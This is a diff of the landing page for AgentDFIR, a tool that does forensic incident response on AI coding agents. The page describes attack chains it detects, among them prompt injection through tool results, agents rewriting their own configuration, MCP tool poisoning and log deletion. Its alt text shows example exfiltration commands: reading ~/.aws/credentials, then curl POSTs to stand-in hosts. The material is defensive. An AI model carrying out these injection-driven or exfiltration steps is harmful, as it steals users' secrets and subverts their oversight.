-  .hero-cmd{margin:32px 16px 0;padding:12px}
-  .cmd-tabs{overflow-x:auto;scrollbar-width:none}
-  .cmd-tabs button{white-space:nowrap;padding:5px 9px}
-  .show{padding:0 16px;margin-top:56px}
-  .window .wbar span{display:none}
-  .nav-cta .stars{display:none}
-  .cards,.steps,.docs{grid-template-columns:1fr}
-  .lrow{grid-template-columns:110px 1fr}
-  .lrow .bar{display:none}
-  .more-src div{grid-template-columns:1fr;gap:4px}
-  .agents ul{font-size:18px;gap:8px 20px}
-  .close{padding:96px 0 88px}
-}
+/* motion: one hero entrance, then each block reveals as it scrolls in */
+@keyframes rise{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
+@keyframes tilt{from{opacity:0;transform:perspective(1600px) rotateX(18deg) translateY(60px) scale(.96)}to{opacity:1;transform:perspective(1600px) rotateX(0) translateY(0) scale(1)}}
+@keyframes blink{50%{opacity:0}}
+.js .hero-grid>div>*{opacity:0;animation:rise .7s cubic-bezier(.2,.7,.2,1) forwards}
+.js .hero-grid>div>*:nth-child(1){animation-delay:.05s}.js .hero-grid>div>*:nth-child(2){animation-delay:.15s}
+.js .hero-grid>div>*:nth-child(3){animation-delay:.28s}.js .hero-grid>div>*:nth-child(4){animation-delay:.4s}
+.js .hero-grid>.term{opacity:0;animation:rise .8s .35s cubic-bezier(.2,.7,.2,1) forwards}
+.js .window{opacity:0;transform-origin:50% 0}
+.js .window.in{animation:tilt 1.1s cubic-bezier(.16,.8,.2,1) forwards}
+.js .shot{opacity:0;transform:translateX(40px) rotate(2deg);transition:opacity .8s .5s,transform .9s .5s cubic-bezier(.2,.7,.2,1)}
+.js .shot.in{opacity:1;transform:rotate(1.2deg)}
+.js .out .ln{opacity:0}
+.js .out .ln.on{opacity:1;transition:opacity .25s}
+.cursor{display:inline-block;width:8px;height:15px;background:var(--amber);vertical-align:-2px;animation:blink 1s steps(1) infinite}
+.js .rv{opacity:0;transform:translateY(28px);transition:opacity .8s cubic-bezier(.2,.7,.2,1),transform .8s cubic-bezier(.2,.7,.2,1)}
+.js .rv.in{opacity:1;transform:none}
+.js .stg>*{opacity:0;transform:translateY(14px);transition:opacity .5s,transform .5s cubic-bezier(.2,.7,.2,1)}
+.js .stg.in>*{opacity:1;transform:none}
+.js .pic{transition:transform .6s cubic-bezier(.2,.7,.2,1),border-color .3s}
+.pic:hover{border-color:#3b465b}
+.js .panel pre .tl{opacity:0}
+.js .panel pre .tl.on{opacity:1;transition:opacity .2s}
+.spec b{font-variant-numeric:tabular-nums}
 @media (prefers-reduced-motion:reduce){
-  html{scroll-behavior:auto}
-  .reveal .s-chain,.reveal .s-proof{animation:none!important;opacity:1}
-  .pill,.toast{transition:none}
+  .js .hero-grid>div>*,.js .hero-grid>.term,.js .window,.js .shot,.js .rv,.js .stg>*,.js .out .ln,.js .panel pre .tl{opacity:1!important;transform:none!important;animation:none!important;transition:none!important}
+  .cursor{animation:none}
 }
+@media (max-width:1080px){
+  .hero-grid,.split,.split.rev{grid-template-columns:1fr;gap:40px}
+  .split.rev>:first-child{order:0}
+  .spec{grid-template-columns:repeat(3,1fr)}
+  .spec div:nth-child(4){border-left:0}
+  .spec div:nth-child(n+4){border-top:1px solid var(--line)}
+  .shot{display:none}
+  .grid{grid-template-columns:1fr 1fr}
+  .cell:nth-child(n){border-left:1px solid var(--line);border-top:1px solid var(--line)}
+  .cell:nth-child(2n+1){border-left:0}
+  .cell:nth-child(-n+2){border-top:0}
+  .integ,.steps{grid-template-columns:1fr 1fr}
+  .integ div:nth-child(3),.steps li:nth-child(3){border-left:0}
+  .integ div:nth-child(n+3),.steps li:nth-child(n+3){border-top:1px solid var(--line)}
+  .pair,.faq{grid-template-columns:1fr}
+  .docs{grid-template-columns:1fr 1fr}
+}
+@media (max-width:760px){
+  .nav-links{display:none}
+  .wrap,.show{padding:0 16px}
+  .hero{padding-top:48px}
+  section{padding:80px 0}
+  .spec{grid-template-columns:1fr 1fr}
+  .spec div:nth-child(n){border-left:1px solid var(--line);border-top:1px solid var(--line)}
+  .spec div:nth-child(odd){border-left:0}
+  .spec div:nth-child(-n+2){border-top:0}
+  .grid,.integ,.steps,.docs{grid-template-columns:1fr}
+  .cell:nth-child(n),.integ div:nth-child(n),.steps li:nth-child(n){border-left:0;border-top:1px solid var(--line)}
+  .cell:first-child,.integ div:first-child,.steps li:first-child{border-top:0}
+  .lrow{grid-template-columns:120px 1fr}
+  .lrow .meter{display:none}
+  .chan div{grid-template-columns:1fr;gap:4px}
+  .nav-r .ver{display:none}
+}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{transition:none!important}}
 </style>
 </head>
 <body>
+<script>document.documentElement.classList.add("js")</script>
 
 <header class="nav">
   <div class="wrap">
     <a class="brand" href="#" aria-label="AgentDFIR home">
-      <svg width="26" height="26" viewBox="0 0 32 32" aria-hidden="true"><rect width="32" height="32" rx="9" fill="#17191c"/><circle cx="14.5" cy="14.5" r="6" fill="none" stroke="#fbe1d1" stroke-width="2.6"/><path d="m19 19 5 5" stroke="#fbe1d1" stroke-width="2.6" stroke-linecap="round"/></svg>
+      <svg width="24" height="24" viewBox="0 0 32 32" aria-hidden="true"><path d="M16 4 6.5 7.7v7c0 5.9 4 10.6 9.5 12.6 5.5-2 9.5-6.7 9.5-12.6v-7z" fill="none" stroke="#ffb224" stroke-width="2.2" stroke-linejoin="round"/><path d="M11.5 16 14.8 19l6.1-6.6" fill="none" stroke="#ffb224" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
       AgentDFIR
     </a>
     <nav class="nav-links" aria-label="Main">
       <a href="#evidence">Evidence</a>
-      <a href="#explorer">Explorer</a>
-      <a href="#forensics">Forensics</a>
+      <a href="#chains">Attack chains</a>
+      <a href="#custody">Chain of custody</a>
+      <a href="#coverage">Coverage</a>
       <a href="#install">Install</a>
       <a href="#docs">Docs</a>
     </nav>
-    <div class="nav-cta">
-      <a class="stars tlink" href="https://github.com/efij/AgentDFIR">GitHub</a>
-      <a class="pill fill" href="#install">Install</a>
+    <div class="nav-r">
+      <a class="ver" href="https://github.com/efij/AgentDFIR/releases/latest">v2.6.0</a>
+      <a class="btn" href="https://github.com/efij/AgentDFIR">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.39 7.86 10.91.58.11.79-.25.79-.55v-2.17c-3.2.7-3.87-1.36-3.87-1.36-.52-1.33-1.28-1.68-1.28-1.68-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.19 1.76 1.19 1.03 1.75 2.69 1.25 3.35.95.1-.75.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.19-3.09-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.18 1.18a11.1 11.1 0 0 1 5.79 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.12 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.25 5.66.41.35.77 1.05.77 2.12v3.15c0 .3.21.66.8.55A11.51 11.51 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+        GitHub
+      </a>
     </div>
   </div>
 </header>
 
 <main>
 <div class="hero">
-  <div class="stage">
-    <div class="hero-copy">
-      <h1>What did your AI agents <em>actually do?</em></h1>
-      <p class="lede">One command finds every AI agent on your machine, seals what it left behind as evidence, and shows you, step by step and in plain words, what it did. Nothing leaves your computer.</p>
-      <div class="ctas">
-        <button class="pill fill" type="button" data-copy-active>Copy the install command</button>
-        <a class="pill ghost" href="https://github.com/efij/AgentDFIR">View on GitHub</a>
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <a class="status" href="https://github.com/efij/AgentDFIR/blob/main/CHANGELOG.md"><i aria-hidden="true"></i>v2.6.0 released — per-account attribution, MCP timeline</a>
+        <h1>Incident response for <span class="a">AI agents</span>.</h1>
+        <p class="sub">Claude Code, Codex, Cursor and eleven other agents run shell commands, read credentials and call MCP servers with your privileges. AgentDFIR acquires what they leave on disk into sealed, hash-chained evidence, reconstructs the attack chain, and puts the exact log line behind every finding.</p>
+        <div class="ctas">
+          <a class="btn primary" href="#install">Install</a>
+          <a class="btn" href="https://github.com/efij/AgentDFIR/blob/main/docs/detection-coverage.md">Detection coverage</a>
+        </div>
+      </div>
+      <div class="term" id="term">
+        <div class="term-top">
+          <div class="dots" aria-hidden="true"><i></i><i></i><i></i></div>
+          <div class="tabs" role="tablist" aria-label="Platform">
+            <button role="tab" aria-selected="true" data-os="unix">macOS · Linux</button>
+            <button role="tab" aria-selected="false" data-os="win">Windows</button>
+            <button role="tab" aria-selected="false" data-os="brew">brew</button>
+            <button role="tab" aria-selected="false" data-os="choco">choco</button>
+            <button role="tab" aria-selected="false" data-os="go">go</button>
+          </div>
+        </div>
+        <div class="term-body">
+          <div class="cmd"><span class="p" id="cmd-p">$</span><code id="cmd-body">curl -fsSL https://raw.githubusercontent.com/efij/AgentDFIR/main/install.sh | sh &amp;&amp; ~/.local/bin/agentdfir run</code><button class="copy" type="button" id="copy">copy</button></div>
+<div class="out" aria-label="Example output of agentdfir run"><b>Step 1/4  Detect</b>   claude-code  codex-cli  cursor-cli  +3
+<b>Step 2/4  Collect</b>  sealed 9,036 artifacts · SHA256SUMS written
+<b>Step 3/4  Analyze</b>  115,655 events · 8 chains evaluated
+           <span class="hi">3 CRITICAL</span>  <span class="w">167 HIGH</span>  457 MEDIUM
+<b>Step 4/4  Look</b>     http://127.0.0.1:53114/  <span class="ok">loopback · read-only</span></div>
+        </div>
+        <div class="term-note">SHA-256 verified install, one static binary, nothing executed on the evidence. <a href="https://github.com/efij/AgentDFIR/blob/main/docs/install.md">Air-gapped and USB use</a></div>
       </div>
     </div>
 
-    <div class="art cmd hero-cmd" id="cmd">
-        <div class="cmd-tabs" role="tablist" aria-label="Operating system">
-          <button role="tab" aria-selected="true" data-os="unix">macOS &amp; Linux</button>
-          <button role="tab" aria-selected="false" data-os="win">Windows</button>
-          <button role="tab" aria-selected="false" data-os="brew">Homebrew</button>
-          <button role="tab" aria-selected="false" data-os="choco">Chocolatey</button>
-        </div>
-        <div class="cmd-line">
-          <code id="cmd-text"><span class="p">$</span><span id="cmd-body">curl -fsSL https://raw.githubusercontent.com/efij/AgentDFIR/main/install.sh | sh &amp;&amp; ~/.local/bin/agentdfir run</span></code>
-          <button class="send" type="button" data-copy-active aria-label="Copy the install command">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="12" height="12" rx="2.5"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>
-          </button>
-        </div>
-        <p class="cmd-note">Checks the download’s SHA-256, installs one file, runs nothing else. <a href="https://github.com/efij/AgentDFIR/blob/main/docs/install.md">Portable binaries for USB and air-gapped machines</a></p>
-      </div>
-
-    <div class="show reveal">
-      <figure class="window">
-        <div class="wbar" aria-hidden="true"><i></i><i></i><i></i><span>127.0.0.1 — AgentDFIR case explorer</span></div>
-        <img src="img/hero-app.webp" width="1440" height="1000" alt="The AgentDFIR case explorer on a demo case. The finding “The agent read a password or key, then sent data out” is open: marked Act now, with what happened, why it matters, what to ask yourself, the most likely start, and the story diagram of the steps.">
-      </figure>
-      <figure class="art shot s-chain">
-        <img src="img/st-chain.webp" width="616" height="820" loading="lazy" alt="Close-up of the story diagram: the AI agent opened ~/.aws/credentials (flagged step 1), the tool answered with the keys masked, then the agent ran curl -X POST to cdn.acme-metrics.example (flagged step 2).">
-      </figure>
-      <figure class="art shot s-proof">
-        <img src="img/pr-top.webp" width="720" height="400" loading="lazy" alt="The proof drawer for the flagged command: when, who, which conversation and account, the exact command, the tool, and the address it was sent to.">
-      </figure>
+    <div class="spec stg" role="list">
+      <div role="listitem"><b>14</b><span>AI agents parsed</span></div>
+      <div role="listitem"><b>140</b><span>deterministic detections</span></div>
+      <div role="listitem"><b>8</b><span>attack chains</span></div>
+      <div role="listitem"><b>ATLAS 5.6</b><span>+ ATT&amp;CK mapping</span></div>
+      <div role="listitem"><b>SHA-256</b><span>sealed, hash-chained</span></div>
+      <div role="listitem"><b>0</b><span>runtime dependencies</span></div>
     </div>
-    <p class="demo-note">Screenshots of the real explorer, taken on the synthetic incident that <code>agentdfir simulate</code> generates.</p>
+  </div>
+
+  <div class="show">
+    <figure class="window">
+      <div class="wbar" aria-hidden="true"><i></i><i></i><i></i><span>127.0.0.1:53114 — AgentDFIR case explorer</span></div>
+      <img src="img/hero-app.webp" width="1440" height="1000" alt="AgentDFIR case explorer, dark theme. Open finding: “The agent read a password or key, then sent data out”, severity Act now, with what happened, why it matters, the most likely start, the matched chain steps and the outside address.">
+    </figure>
+    <figure class="shot">
+      <img src="img/st-chain.webp" width="616" height="820" loading="lazy" alt="Story diagram close-up: the agent opened ~/.aws/credentials (flagged step 1), the tool answered with the keys masked, then the agent ran curl -X POST to cdn.acme-metrics.example (flagged step 2).">
+    </figure>
+  </div>
+
+  <div class="wrap">
+    <div class="agents rv">
+      <p>Parses the on-disk evidence of</p>
+      <ul>
+        <li>Claude Code</li><li>Claude Cowork</li><li>Codex CLI + app</li><li>Cursor</li><li>Gemini CLI</li><li>Copilot CLI</li><li>Copilot Chat</li><li>Cline</li><li>Roo Code</li><li>OpenCode</li><li>OpenClaw</li><li>Aider</li><li>Warp</li><li>Kiro</li>
+      </ul>
+    </div>
   </div>
 </div>
 
-<div class="agents">
-  <p>Reads the evidence of fourteen AI agents</p>
-  <ul>
-    <li>Claude Code</li><li>Claude Cowork</li><li>Codex</li><li>Cursor</li><li>Gemini CLI</li><li>Copilot CLI</li><li>Copilot Chat</li><li>Cline</li><li>Roo Code</li><li>OpenCode</li><li>OpenClaw</li><li>Aider</li><li>Warp</li><li>Kiro</li>
-  </ul>
-</div>
-
-<section id="evidence" class="band">
+<section id="evidence">
   <div class="wrap split">
-    <div>
-      <h2>A model saying “I ran it” is not proof that it ran.</h2>
-      <p class="lede">AI-written text is never treated as evidence. Every action in every timeline says how strongly it is backed, from a claim in the chat to a record the operating system kept on its own.</p>
+    <div class="rv">
+      <h2>Model output is a claim. It is never evidence.</h2>
+      <p class="sub" style="margin-top:18px">“I ran <code>curl example.com</code>” in a transcript proves nothing. Every event in every timeline carries a corroboration state, so narrative can never be mistaken for host activity, and a second witness (auditd, Sysmon, EDR, your MCP gateway) can confirm or contradict it.</p>
+      <ul class="stg points">
+        <li><b>Endpoint corroboration.</b> <code>analyze --endpoint audit.log</code> matches tool calls to OS process and network records.</li>
+        <li><b>Contradictions surface.</b> An agent that says it did something the OS never saw is a finding of its own.</li>
+        <li><b>Off-the-record activity.</b> Processes and connections the agent never logged are reported as unlogged.</li>
+      </ul>
     </div>
-    <div class="art ladder" role="table" aria-label="Corroboration states, weakest to strongest">
-      <div class="q"><div class="k">One action, six possible answers</div><code>curl -X POST paste.example.net -d @-</code></div>
-      <div class="lrow" role="row"><b role="cell">Requested</b><span role="cell">A person asked for it</span><i class="bar" aria-hidden="true"><u class="f"></u><u></u><u></u><u></u></i></div>
-      <div class="lrow" role="row"><b role="cell">Reported</b><span role="cell">The model <em>said</em> it happened</span><i class="bar" aria-hidden="true"><u class="f"></u><u></u><u></u><u></u></i></div>
-      <div class="lrow" role="row"><b role="cell">Observed</b><span role="cell">A tool-call record is in the transcript</span><i class="bar" aria-hidden="true"><u class="f"></u><u class="f"></u><u></u><u></u></i></div>
-      <div class="lrow on" role="row"><b role="cell">Corroborated</b><span role="cell">auditd or Sysmon saw the same process</span><i class="bar" aria-hidden="true"><u class="f"></u><u class="f"></u><u class="f"></u><u class="f"></u></i></div>
-      <div class="lrow" role="row"><b role="cell">Contradicted</b><span role="cell">The host shows it did not happen</span><i class="bar" aria-hidden="true"><u class="f"></u><u class="f"></u><u class="f"></u><u class="f"></u></i></div>
-      <div class="lrow" role="row"><b role="cell">Unknown</b><span role="cell">Not enough evidence, said plainly</span><i class="bar" aria-hidden="true"><u></u><u></u><u></u><u></u></i></div>
-    </div>
-  </div>
-</section>
-
-<section id="explorer">
-  <div class="wrap stack">
-    <div class="split">
-      <div>
-        <h2>Written for whoever finds the problem, not only for analysts.</h2>
-        <p class="lede">The case explorer opens in your browser and starts with an answer: how many things need action, and which one to look at first. Thousands of alerts become twenty kinds of issue, each explained in a sentence.</p>
-        <ul class="points">
-          <li><b>Grouped, then ranked.</b> Repeats fold into one row, the most serious and most likely real on top.</li>
-          <li><b>Which account did it.</b> Every finding names the AI account behind it, read from the agent’s own profile and never its tokens.</li>
-          <li><b>Secrets stay masked</b> on screen, so reviewing a leak doesn’t leak it again.</li>
-        </ul>
-      </div>
-      <figure class="art pic"><img src="img/ov-top.webp" width="1440" height="780" loading="lazy" alt="The explorer’s Overview: “3 alerts need action now”, tiles for Act now, Serious, Worth a look and Minor, and a Start here list of the most serious kinds of issue."></figure>
-    </div>
-
-    <div class="split rev">
-      <div>
-        <h2>Not a list of alerts. <em>What happened,</em> in order.</h2>
-        <p class="lede">Under each finding is a diagram with three lanes: you, the agent, and the tools it used. It marks where the trouble started and which step was flagged, and every card is a real line from the log.</p>
-        <ul class="points">
-          <li><b>Attack chains.</b> Injected text in a tool answer, then the agent rewrites its own instructions, then a shell runs. Eight chains built in, mapped to MITRE ATLAS.</li>
-          <li><b>MCP timeline.</b> What each MCP server was sent, and what it answered.</li>
-          <li><b>Three questions per finding:</b> what this means, what to ask yourself, what to do.</li>
-        </ul>
-      </div>
-      <figure class="art pic tall"><img src="img/st-inj.webp" width="916" height="1100" loading="lazy" alt="Story diagram of an attack chain: you asked the agent to read a vendor setup guide; the tool’s answer contained hidden instructions (marked Start, flagged step 1); the agent then wrote its own settings file and ran a command."></figure>
-    </div>
-
-    <div class="split">
-      <div>
-        <h2>Every claim has a line behind it.</h2>
-        <p class="lede">“Show proof” opens the exact line the agent wrote, with its file and line number, and every finding that one step set off. Search runs over every byte of the sealed evidence, not only the parsed events.</p>
-      </div>
-      <figure class="art pic"><img src="img/pr-line.webp" width="720" height="777" loading="lazy" alt="The proof drawer: every finding this step triggered, buttons to mark it as key evidence or see what led to it, and the exact line from the sealed log with its file and line number."></figure>
+    <div class="stg ladder" role="table" aria-label="Corroboration states from weakest to strongest">
+      <div class="lrow" role="row"><span role="cell" class="st st-rep">REPORTED</span><span role="cell">The model said it happened</span><i class="meter" aria-hidden="true"><u class="f"></u><u></u><u></u><u></u></i></div>
+      <div class="lrow" role="row"><span role="cell" class="st st-req">REQUESTED</span><span role="cell">A person asked for it</span><i class="meter" aria-hidden="true"><u class="f"></u><u></u><u></u><u></u></i></div>
+      <div class="lrow" role="row"><span role="cell" class="st st-obs">OBSERVED</span><span role="cell">A tool-call record is in the transcript</span><i class="meter" aria-hidden="true"><u class="f"></u><u class="f"></u><u></u><u></u></i></div>
+      <div class="lrow cor" role="row"><span role="cell" class="st st-cor">CORROBORATED</span><span role="cell">Independent endpoint or network evidence agrees</span><i class="meter" aria-hidden="true"><u></u><u></u><u></u><u></u></i></div>
+      <div class="lrow con" role="row"><span role="cell" class="st st-con">CONTRADICTED</span><span role="cell">Endpoint evidence shows it did not happen</span><i class="meter" aria-hidden="true"><u></u><u></u><u></u><u></u></i></div>
+      <div class="lrow" role="row"><span role="cell" class="st st-unk">UNKNOWN</span><span role="cell">Not enough evidence, stated plainly</span><i class="meter" aria-hidden="true"><u></u><u></u><u></u><u></u></i></div>
     </div>
   </div>
 </section>
 
-<section class="peach-wrap" style="padding-top:0">
+<section id="chains" class="band">
+  <div class="wrap split rev">
+    <div class="rv">
+      <h2>Seven hundred alerts are not an answer. The chain is.</h2>
+      <p class="sub" style="margin-top:18px">Attack chains match ordered steps inside one session: harmless alone, an incident together. Each match is one finding with the steps, the root cause marked, and the event that proves every step.</p>
+      <ul class="stg chains">
+        <li><span><span class="sev c">CRIT</span>Secret read, then data left the host</span><code>AML.T0086 · T1048</code></li>
+        <li><span><span class="sev c">CRIT</span>Tool result rewrote instructions, then code ran</span><code>AML.T0080.000 · T1059</code></li>
+        <li><span><span class="sev c">CRIT</span>Poisoned MCP result, then a destructive command</span><code>AML.T0099 · T1485</code></li>
+        <li><span><span class="sev c">CRIT</span>Orphan agent changed config, then acted</span><code>AML.T0081 · T1562.001</code></li>
+        <li><span><span class="sev c">CRIT</span>Risky action, then the agent's logs deleted</span><code>AML.T0101 · T1070.004</code></li>
+        <li><span><span class="sev h">HIGH</span>Injected instructions, then code pushed</span><code>AML.T0010 · T1195.002</code></li>
+        <li><span><span class="sev h">HIGH</span>Subagent cross-talk, then exfiltration</span><code>AML.T0086 · T1048</code></li>
+        <li><span><span class="sev m">MED</span>Download, then execute</span><code>T1105</code></li>
+      </ul>
+      <a class="more" href="https://github.com/efij/AgentDFIR/blob/main/docs/attack-chains.md">Write your own chains in JSON</a>
+    </div>
+    <figure class="rv pic tall fade"><img src="img/st-inj.webp" width="916" height="1100" loading="lazy" alt="Story diagram of a context-poisoning chain: the user asked the agent to read a vendor setup guide; the tool answer carried hidden instructions (marked Start, flagged step 1); the agent then wrote its own settings file (flagged step 2) and ran a shell command."></figure>
+  </div>
+</section>
+
+<section>
+  <div class="wrap split">
+    <div class="rv">
+      <h2>Every finding resolves to a line in a sealed file.</h2>
+      <p class="sub" style="margin-top:18px">Open any step and you get the raw transcript line, its logical path and line number, every other rule the same event triggered, and the account that ran it. Whole-case search covers every byte of the sealed evidence, not only the parsed events.</p>
+      <ul class="stg points">
+        <li><b>Per-account attribution.</b> Findings name the AI account behind them, read from the agent's own profile. Tokens are never read.</li>
+        <li><b>Secrets masked on screen.</b> Reviewing a leak does not leak it again.</li>
+        <li><b>Case file.</b> Verdicts, pinned evidence and notes go to a hash-chained log outside the sealed zone, attributed to the analyst.</li>
+      </ul>
+    </div>
+    <figure class="rv pic"><img src="img/pr-line.webp" width="720" height="740" loading="lazy" alt="Proof drawer: every finding the step triggered, from Act now to Minor, then the exact line from the sealed log with its path and line number."></figure>
+  </div>
+</section>
+
+<section id="custody" class="band">
   <div class="wrap">
-    <div class="peach">
-      <h2>Nothing leaves your machine. Not the evidence, not the findings.</h2>
-      <div>
-        <p style="margin-bottom:24px">There is no account, no cloud and no telemetry. The explorer listens on 127.0.0.1 only and loads nothing from the internet.</p>
-        <ul>
-          <li>No language model in the analysis, so every finding is a rule you can read</li>
-          <li>Suspect binaries are never executed, symlinks never followed</li>
-          <li>The sealed evidence is never written to after collection</li>
-        </ul>
+    <div class="rv head">
+      <h2>Chain of custody that survives cross-examination.</h2>
+      <p class="sub">Every acquisition is a sealed <code>.adfir</code> package: content-addressed blobs, hash-chained collection and custody logs, a SHA-256 seal over the evidence zone, optional ed25519 signature. The format is open, so any tool can verify it without AgentDFIR.</p>
+    </div>
+    <div class="rv pair">
+      <div class="panel">
+        <div class="ph"><span>$ agentdfir verify CASE-2026-042.adfir</span><span class="ok">exit 0</span></div>
+<pre>Depth:              full (every stored blob re-hashed)
+Rounds:             1
+Artifacts OK:       6 (not acquired: 0)
+Collection records: 26 (hash chain)
+Custody records:    3 (hash chain)
+Signature:          none (package is unsigned)
+Result:             <span class="ok">VERIFIED — no modifications detected</span></pre>
+      </div>
+      <div class="panel">
+        <div class="ph"><span>one byte changed in raw/240b7ed8…</span><span class="bad">exit 1</span></div>
+<pre>Depth:              full (every stored blob re-hashed)
+Artifacts OK:       6 (not acquired: 0)
+Collection records: 26 (hash chain)
+Custody records:    3 (hash chain)
+Result:             <span class="bad">FAILED — 2 problem(s):</span>
+  - raw/240b7ed8bfdeafa9e562…: <span class="bad">hash mismatch</span>
+  - .claude/projects/-Users-dev-app/5f0c9c1e….jsonl:
+    <span class="bad">content-address mismatch</span></pre>
+      </div>
+      <div class="panel" style="grid-column:1/-1">
+        <div class="ph"><span>case.adfir/</span><span>open format · docs/adfir-spec.md</span></div>
+<pre><b>raw/</b>&lt;sha256&gt;[.gz]           <span class="c"># content-addressed evidence, sealed once, never rewritten</span>
+<b>manifest.jsonl</b>              <span class="c"># every artifact: source path, size, times, hash, round</span>
+<b>collection.jsonl</b>            <span class="c"># hash-chained acquisition log, including every failure</span>
+<b>chain-of-custody.jsonl</b>      <span class="c"># hash-chained: who touched the package, when, why</span>
+<b>SHA256SUMS</b>                  <span class="c"># seals the evidence zone; seals/ keeps every earlier round's</span>
+<b>normalized/ detections/</b>     <span class="c"># analysis overlay, regenerable, never part of the seal</span></pre>
       </div>
     </div>
   </div>
 </section>
 
-<section id="forensics" class="band">
+<section>
   <div class="wrap">
-    <div class="split">
-      <div>
-        <h2>Evidence that holds up after the incident.</h2>
-        <p class="lede">Each collection is a sealed <code>.adfir</code> package: content-addressed, hash-chained, verifiable by anyone, and readable without AgentDFIR. Analysis sits beside the evidence as a layer you can rebuild, and never inside it.</p>
-      </div>
-      <div class="art tree" role="img" aria-label="Directory tree of an .adfir evidence package"><span class="d">case.adfir/</span>
-├── <span class="d">raw/</span>&lt;sha256&gt;[.gz]      <span class="c"># the evidence, by content</span>
-├── manifest.jsonl         <span class="c"># what was taken, from where</span>
-├── collection.jsonl       <span class="c"># hash-chained log</span>
-├── chain-of-custody.jsonl <span class="c"># who touched it, when</span>
-├── case.json              <span class="c"># operator, clock, rounds</span>
-├── SHA256SUMS             <span class="c"># seals the evidence zone</span>
-├── <span class="d">normalized/</span>            <span class="c"># events, entities, graph</span>
-└── <span class="d">detections/</span>            <span class="c"># findings.json</span></div>
+    <div class="rv head">
+      <h2>Built for hostile hosts.</h2>
+      <p class="sub">Assume the machine is compromised and the evidence is adversarial. Suspect binaries are never executed, symlinks never followed, and ANSI escapes and invisible Unicode are neutralized before they reach your terminal.</p>
     </div>
-    <div class="cards">
-      <div class="card"><div class="k">Tamper-evident</div><h3>One flipped byte fails verify</h3><p><code>agentdfir verify</code> names the exact artifact that changed. Custody logs are hash-chained, so deleting a record breaks every record after it.</p></div>
-      <div class="card"><div class="k">Second witness</div><h3>The OS gets a say</h3><p>Feed it auditd, Sysmon or an EDR export and each tool call is confirmed or contradicted, and activity the agent never logged surfaces on its own.</p></div>
-      <div class="card"><div class="k">Supply chain</div><h3>Every MCP server, audited</h3><p>Across every agent on the host: unpinned packages, plaintext transports, auto-approve, poisoned tool descriptions and drift from your baseline.</p></div>
-      <div class="card"><div class="k">Provenance</div><h3>Who wrote CLAUDE.md</h3><p>For each line of CLAUDE.md, AGENTS.md or .cursorrules: which session and agent wrote it, and whether it came from a person or from tool output.</p></div>
-      <div class="card"><div class="k">Coverage</div><h3>140 detections, all readable</h3><p>Every high and critical rule is mapped to MITRE ATLAS 5.6 and ATT&amp;CK. Rules are JSON you can extend, and the coverage matrix is generated from the binary.</p></div>
-      <div class="card"><div class="k">Interop</div><h3>Fits your existing stack</h3><p>Import KAPE, Velociraptor and CyLR trees. Export OCSF, SARIF, Sigma, STIX, Timesketch and l2tcsv. Collect from containers and CI archives.</p></div>
+    <div class="stg grid">
+      <div class="cell"><code class="k">agentdfir mcp audit</code><h3>MCP supply chain</h3><p>Every MCP server across every agent: unpinned packages, plaintext transports, auto-approve, poisoned tool descriptions, name collisions and baseline drift.</p></div>
+      <div class="cell"><code class="k">agentdfir provenance</code><h3>Instruction provenance</h3><p>For each line of CLAUDE.md, AGENTS.md or .cursorrules: which session and agent wrote it, and whether it came from a person or from tool output.</p></div>
+      <div class="cell"><code class="k">agentdfir monitor --detect</code><h3>Real-time sensor</h3><p>Exfil sequences, honeytoken hits and self-modification pushed to a webhook, syslog or file within seconds of the transcript line being written.</p></div>
+      <div class="cell"><code class="k">collect --live</code><h3>Volatile acquisition</h3><p>RFC 3227 order of volatility: running agent processes, open files and connections first, then the on-disk evidence, with torn-read detection for files still being written.</p></div>
+      <div class="cell"><code class="k">agentdfir simulate</code><h3>Adversary emulation</h3><p>Generate orphan-agent and toxic-chain incidents to validate your detections and train responders before the real one.</p></div>
+      <div class="cell"><code class="k">rules/*.json</code><h3>Rules you can read</h3><p>No model in the analysis path. Detections are deterministic Go and JSON rule packs, signed pack updates, and a coverage matrix generated from the binary.</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="coverage" class="band">
+  <div class="wrap">
+    <div class="rv head">
+      <h2>Mapped to MITRE ATLAS and ATT&amp;CK.</h2>
+      <p class="sub">Every HIGH and CRITICAL detection carries a technique, including ATLAS's agentic family. The mapping is enforced by tests, so a rule cannot ship without one.</p>
+    </div>
+    <div class="rv tbl">
+      <table class="atlas">
+        <thead><tr><th>ATLAS</th><th>Technique</th><th>Rules</th></tr></thead>
+        <tbody>
+          <tr><td>AML.T0086</td><td>Exfiltration via AI Agent Tool Invocation</td><td>CHAIN_SECRET_TO_EXFIL, POTENTIAL_DATA_EXFILTRATION, CURL_FILE_UPLOAD…</td></tr>
+          <tr><td>AML.T0080.000</td><td>Memory (context poisoning)</td><td>CHAIN_CONTEXT_POISON_TO_EXEC, INSTRUCTION_FROM_TOOL_RESULT, AGENT_CONTEXT_POISONING…</td></tr>
+          <tr><td>AML.T0081</td><td>Modify AI Agent Configuration</td><td>AGENT_SELF_MODIFICATION, PERMISSION_BYPASS_ENABLED, CHAIN_ORPHAN_PERSISTENCE…</td></tr>
+          <tr><td>AML.T0083</td><td>Credentials from AI Agent Configuration</td><td>AGENT_CREDENTIAL_STORE_ACCESS</td></tr>
+          <tr><td>AML.T0110</td><td>AI Agent Tool Poisoning</td><td>MCP_TOOL_DESCRIPTION_POISONING, TOOL_POISONING_INDICATOR</td></tr>
